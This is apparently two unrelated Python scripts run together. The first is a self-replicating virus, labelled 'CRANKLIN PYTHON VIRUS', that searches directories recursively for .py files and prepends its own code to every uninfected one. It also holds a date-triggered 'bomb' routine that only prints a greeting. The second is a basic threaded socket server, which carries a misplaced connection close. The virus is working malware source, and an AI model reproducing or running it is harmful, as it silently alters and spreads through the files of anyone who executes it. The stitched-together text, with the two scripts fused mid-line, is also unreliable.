import os
import datetime
SIGNATURE = "CRANKLIN PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print("Happy birthday")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()import socket
import threading

HEADER=64
FORMAT='utf-8'
PORT=5050 
SERVER=socket.gethostbyname(socket.gethostname())
ADDR=(SERVER, PORT)
DISCONNECT_MESSAGE="!DISCONNECT"

server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected")
    connected=True
    while connected:
        msg_length=conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length=int(msg_length)
            msg=conn.recv(msg_length).decode(FORMAT)
            if msg==DISCONNECT_MESSAGE:
                connected=False
            print(f"[{addr}] {msg}")

        conn.close()
        
def start():
    server.listen()
    print(f"[LISTENINFG] Server is starting {SERVER}")
    while True:
        conn, addr=server.accept()
        thread=threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        active=threading.activeCount()-1
        print(active)

print("[STARTING] Server is starting...........")
start()